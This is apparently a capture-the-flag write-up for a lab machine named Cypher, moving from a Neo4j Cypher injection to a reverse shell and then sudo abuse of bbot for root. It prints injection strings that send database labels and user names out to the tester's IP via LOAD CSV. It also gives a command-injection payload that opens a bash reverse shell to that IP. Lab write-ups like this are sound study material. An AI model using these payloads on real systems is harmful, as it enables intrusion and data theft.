# Cypher

## Scanning

See nmap-scan-results. 
Nmap scan showed that port 22 and port 80 are open. So first thing was to visit the website at port 80.
Additionally, the Nmap scan showed that the domain is called "cypher.htb", so this is added to my `/etc/hosts` file. 

## Web Enumeration

Before visiting the website, I started up `dirsearch` and `ffuf` to perform directory busting and vhost busting respectively. While that was running, I visited the website.  

When visiting the website, http://cypher.htb, there is only one button, clicking on it will bring me to a login form. When filling up the form with intended data, all it reveals is 'Access denied'. When fuzzed, it throws out a lot of errors, primarily Python errors but near the end of the stack trace, there's a query that is querying a databaes (at least it seems like it at first). Since the directory busting and vhost busting was still running, I checked out the query and after some research it is called Cypher query and is used by Neo4j. I also found some queries that allowed me to read some columns and get data from the database:

1. ' RETURN 0 as \_0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.17/?l='+label as l RETURN 0 as \_0// -- this command allowed me to read the tables in the database
2. ' OR 1=1 WITH 1 as a MATCH (u:USER) LOAD CSV FROM 'http://10.10.16.17/?value=' + toString(u.name) as l RETURN 0 as \_0; // -- this command allowed me to read the data from the tables identified (USER is one of the tables that are identified from command 1)

All the commands above required a simple web server to be setup (e.g. using Python3 http.server module). There was one table, SHA1 that provided me with a SHA1 hash, but I tried to crack it with `hashcat` but it failed.

Going back to the directory busting and vhost busting attacks, the latter did no return any useful results. Directory busting tho, did show that there are some intersting directories like the `/api` directory and the `/testing` directory. Going into `/testing` first showed that there's a '.jar' file that can be downloaded. Once downloaded and decompiled with jadx, there was one function `String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};` that seemed intersting. 

## Initial Foothold

Based on the line of code found, it seels like there is no sanitization on the `url` variable, before and after that line of code. This makes it vulnerable to code injection, coupled with the Cypher injection vulnerability above, and after more research, it seems like it can be chained together and possibly get a reverse shell. The final payload is:

`CALL custom.getUrlStatusCode('127.0.0.1; bash -c "bash -i >& /dev/tcp/10.10.16.17/4444 0>&1"')`

However, using this paylaod in the login form did not work. So, I tried to find other endpoints that have parameters and it was the subdirectory `/api/cypher` and the param is `query`. With this param and the payload, I was able to establish a reverse shell connection from the victim machine to my kali machine. 

## Internal Enumeration

Once the reverse shell connection is established, there's a file in `/home/graphasm`, and in that file there's a password. Using that password and 'graphasm' username (since that home directory belongs to graphasm), I was able to SSH into the victim machine and get the user flag. 

## Priv Escalation

So, to escalate privileges, I executed `linpeas.sh` but there are no results. So I ran `sudo -l` and the user is able to run `bbot` without password. I checked the `bbot` directories and there are no writable files, the `/opt` folder for bbot also does not have any writable files. Researching online showed me a [GitHub PoC](https://github.com/Housma/bbot-privesc), where the bbot uses a custom yara rule and then the rule will point to a custom malicious module that allowed for priv esc. Once the exploit executed, I gained root privs and I got the root flag.
